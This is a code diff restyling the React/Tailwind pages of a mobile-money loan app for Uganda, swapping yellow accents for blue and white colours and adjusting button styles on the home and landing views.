@@ -31,7 +31,7 @@ function LoggedInHome({
   return (
     <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
       {/* Header */}
-      <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+      <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
         <div className="container mx-auto max-w-5xl flex items-center justify-between">
           <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
             <Logo size="sm" />
@@ -40,13 +40,13 @@ function LoggedInHome({
             </span>
           </div>
           <div className="flex items-center gap-3">
-            <span className="hidden sm:inline-block text-xs font-semibold bg-[hsl(198,100%,22%)]/10 px-2.5 py-1 rounded-full">
+            <span className="hidden sm:inline-block text-xs font-semibold bg-white/10 px-2.5 py-1 rounded-full text-white">
               {session.countryCode} {session.phone}
             </span>
             <button
               id="logout-btn"
               onClick={onLogout}
-              className="flex items-center gap-1.5 bg-[hsl(198,100%,22%)] text-white px-3.5 py-1.5 rounded-xl text-xs sm:text-sm font-bold hover:bg-[hsl(198,100%,22%)]/90 transition shadow-sm"
+              className="flex items-center gap-1.5 bg-[#004F71] text-white px-4 py-2 rounded-full text-xs sm:text-sm font-bold hover:bg-[#003853] transition shadow-sm cursor-pointer"
             >
               <LogOut className="w-4 h-4" />
               <span>Log Out</span>
@@ -61,7 +61,7 @@ function LoggedInHome({
         <div className="bg-gradient-to-r from-[hsl(198,85%,26%)] to-[hsl(198,60%,28%)] rounded-3xl p-6 sm:p-8 mb-8 border border-[hsl(198,55%,32%)] shadow-xl relative overflow-hidden">
           <div className="relative z-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
             <div>
-              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#ffcc00]/15 text-[#ffcc00] text-xs font-bold mb-3 border border-[#ffcc00]/25">
+              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/15 text-white text-xs font-bold mb-3 border border-white/20">
                 <span>Verified MoMo Account</span>
                 <span>•</span>
                 <span>{session.country}</span>
@@ -70,14 +70,14 @@ function LoggedInHome({
                 Welcome back! 👋
               </h1>
               <p className="text-gray-300 text-sm sm:text-base font-medium">
-                Registered Mobile: <span className="text-[#ffcc00] font-bold">{session.countryCode} {session.phone}</span>
+                Registered Mobile: <span className="text-white font-bold">{session.countryCode} {session.phone}</span>
               </p>
             </div>
 
             <button
               id="apply-top-btn"
               onClick={() => navigate('/apply')}
-              className="w-full sm:w-auto px-6 py-3.5 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 group shrink-0"
+              className="w-full sm:w-auto px-8 py-3.5 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-lg flex items-center justify-center gap-2 group shrink-0 cursor-pointer border border-[#006591]/40"
             >
               <span>Apply for Loan</span>
               <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
@@ -90,19 +90,19 @@ function LoggedInHome({
           <div id="application-status-card" className="bg-[hsl(198,85%,26%)] rounded-3xl p-6 sm:p-8 mb-8 border border-[hsl(198,55%,32%)] shadow-xl">
             <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6 pb-4 border-b border-[hsl(198,55%,32%)]">
               <div className="flex items-center gap-3.5">
-                <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 flex items-center justify-center text-[#ffcc00] shrink-0 border border-[#ffcc00]/30">
+                <div className="w-12 h-12 rounded-2xl bg-white/10 flex items-center justify-center text-white shrink-0 border border-white/20">
                   <FileText className="w-6 h-6" />
                 </div>
                 <div>
                   <h3 className="font-extrabold text-lg sm:text-xl">Your Loan Application</h3>
-                  <p className="text-gray-400 text-xs sm:text-sm">
+                  <p className="text-gray-300 text-xs sm:text-sm">
                     Submitted on {new Date(application.submittedAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}
                   </p>
                 </div>
               </div>
 
-              <div className="flex items-center gap-2 bg-[#ffcc00]/15 text-[#ffcc00] px-3.5 py-1.5 rounded-full border border-[#ffcc00]/30 w-fit">
-                <div className="w-2.5 h-2.5 rounded-full bg-[#ffcc00] animate-pulse" />
+              <div className="flex items-center gap-2 bg-emerald-500/20 text-emerald-300 px-3.5 py-1.5 rounded-full border border-emerald-500/30 w-fit">
+                <div className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                 <span className="text-xs sm:text-sm font-bold uppercase tracking-wide">
                   {application.status === 'withdrawn' ? 'Withdrawal Processing' : 'Status: Approved'}
                 </span>
@@ -111,27 +111,27 @@ function LoggedInHome({
 
             <div className="grid grid-cols-2 sm:grid-cols-4 gap-3.5 mb-6">
               <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
-                <p className="text-xs text-gray-400 font-medium mb-1">Approved Amount</p>
-                <p className="font-extrabold text-base sm:text-lg text-[#ffcc00]">{application.amount}</p>
+                <p className="text-xs text-gray-300 font-medium mb-1">Approved Amount</p>
+                <p className="font-extrabold text-base sm:text-lg text-white">{application.amount}</p>
               </div>
               <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
-                <p className="text-xs text-gray-400 font-medium mb-1">Repayment Period</p>
+                <p className="text-xs text-gray-300 font-medium mb-1">Repayment Period</p>
                 <p className="font-bold text-sm sm:text-base text-white">{application.repayment}</p>
               </div>
               <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
-                <p className="text-xs text-gray-400 font-medium mb-1">Loan Purpose</p>
+                <p className="text-xs text-gray-300 font-medium mb-1">Loan Purpose</p>
                 <p className="font-bold text-sm sm:text-base text-white truncate">{application.purpose}</p>
               </div>
               <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)]">
-                <p className="text-xs text-gray-400 font-medium mb-1">Applicant Name</p>
+                <p className="text-xs text-gray-300 font-medium mb-1">Applicant Name</p>
                 <p className="font-bold text-sm sm:text-base text-white truncate">{application.firstName} {application.lastName}</p>
               </div>
             </div>
 
             {application.status === 'withdrawn' ? (
-              <div className="mt-4 p-4 rounded-2xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-between flex-wrap gap-3">
+              <div className="mt-4 p-4 rounded-2xl bg-sky-950/60 border border-sky-400/30 flex items-center justify-between flex-wrap gap-3">
                 <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 rounded-xl bg-amber-500/20 text-[#ffcc00] flex items-center justify-center shrink-0">
+                  <div className="w-10 h-10 rounded-xl bg-sky-500/20 text-sky-300 flex items-center justify-center shrink-0">
                     <Clock className="w-5 h-5 animate-pulse" />
                   </div>
                   <div>
@@ -147,7 +147,7 @@ function LoggedInHome({
                 <button
                   type="button"
                   onClick={() => navigate('/withdrawal-status')}
-                  className="px-4 py-2.5 rounded-xl bg-[#ffcc00] text-gray-950 font-black text-xs hover:bg-[#ffcc00]/90 transition shadow-sm flex items-center gap-1.5 cursor-pointer"
+                  className="px-5 py-2.5 rounded-full bg-[#004F71] text-white font-bold text-xs uppercase tracking-wider hover:bg-[#003853] transition shadow-sm flex items-center gap-1.5 cursor-pointer border border-[#006591]/40"
                 >
                   <span>Track 24hr Progress</span>
                   <ArrowRight className="w-3.5 h-3.5" />
@@ -156,12 +156,12 @@ function LoggedInHome({
             ) : (
               <div className="bg-[hsl(198,100%,22%)] rounded-2xl p-4 border border-[hsl(198,55%,28%)] flex items-center justify-between flex-wrap gap-3">
                 <div className="flex items-center gap-2.5 text-xs sm:text-sm text-gray-300">
-                  <Clock className="w-4 h-4 text-[#ffcc00] shrink-0" />
+                  <Clock className="w-4 h-4 text-sky-300 shrink-0" />
                   <span>Disbursement updates will be sent directly to your Mobile Money number.</span>
                 </div>
                 <button
                   onClick={() => navigate('/apply')}
-                  className="text-xs font-bold text-[#ffcc00] hover:underline"
+                  className="text-xs font-bold text-white hover:underline uppercase tracking-wide"
                 >
                   Apply for another loan
                 </button>
@@ -288,15 +288,15 @@ export default function LandingPage() {
         </a>
 
         {/* Badge */}
-        <div className="inline-flex items-center gap-1.5 px-3 py-1 sm:px-4 sm:py-1.5 rounded-full bg-[hsl(198,80%,28%)] border border-[hsl(198,55%,35%)] text-[11px] sm:text-xs font-bold text-[#ffcc00] mb-3 sm:mb-4 shadow-xs">
-          <Sparkles className="w-3.5 h-3.5" />
+        <div className="inline-flex items-center gap-1.5 px-3 py-1 sm:px-4 sm:py-1.5 rounded-full bg-[hsl(198,80%,28%)] border border-[hsl(198,55%,35%)] text-[11px] sm:text-xs font-bold text-white mb-3 sm:mb-4 shadow-xs">
+          <Sparkles className="w-3.5 h-3.5 text-sky-300" />
           <span>Fast & Affordable Mobile Money Financing in Uganda</span>
         </div>
 
         <Logo size="md" className="mb-3 sm:mb-4 shadow-xl" />
 
         <h1 className="text-2xl sm:text-3xl md:text-4xl font-extrabold tracking-tight max-w-2xl leading-tight mb-2 sm:mb-3">
-          Empower Your Business with Instant <span className="text-[#ffcc00]">MoMo Loans</span>
+          Empower Your Business with Instant <span className="text-white underline decoration-sky-400 decoration-2 underline-offset-4">MoMo Loans</span>
         </h1>
 
         <p className="text-gray-300 text-xs sm:text-sm md:text-base max-w-xl mb-3 sm:mb-4 leading-relaxed font-medium">
@@ -306,7 +306,7 @@ export default function LandingPage() {
         {/* 'Trusted by' & 'Instant Approval' Security Badges Row */}
         <div className="flex flex-wrap items-center justify-center gap-1.5 sm:gap-2 mb-3 sm:mb-4 max-w-xl px-2">
           <div className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-[hsl(198,85%,26%)] border border-[hsl(198,55%,33%)] text-[10px] sm:text-xs text-gray-200 font-bold shadow-xs">
-            <Zap className="w-3 h-3 text-[#ffcc00] shrink-0" />
+            <Zap className="w-3 h-3 text-sky-300 shrink-0" />
             <span>Instant Approval</span>
           </div>
           <div className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-[hsl(198,85%,26%)] border border-[hsl(198,55%,33%)] text-[10px] sm:text-xs text-gray-200 font-bold shadow-xs">
@@ -324,7 +324,7 @@ export default function LandingPage() {
           <button
             id="hero-apply-btn"
             onClick={() => navigate('/apply')}
-            className="w-full sm:w-auto px-8 sm:px-10 py-3 sm:py-3.5 rounded-full bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 transition shadow-xl flex items-center justify-center gap-2 group cursor-pointer"
+            className="w-full sm:w-auto px-10 sm:px-14 py-3.5 sm:py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-xl flex items-center justify-center gap-2 group cursor-pointer border border-[#006591]/50"
           >
             <span>Apply for Loan</span>
             <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 group-hover:translate-x-1 transition-transform" />
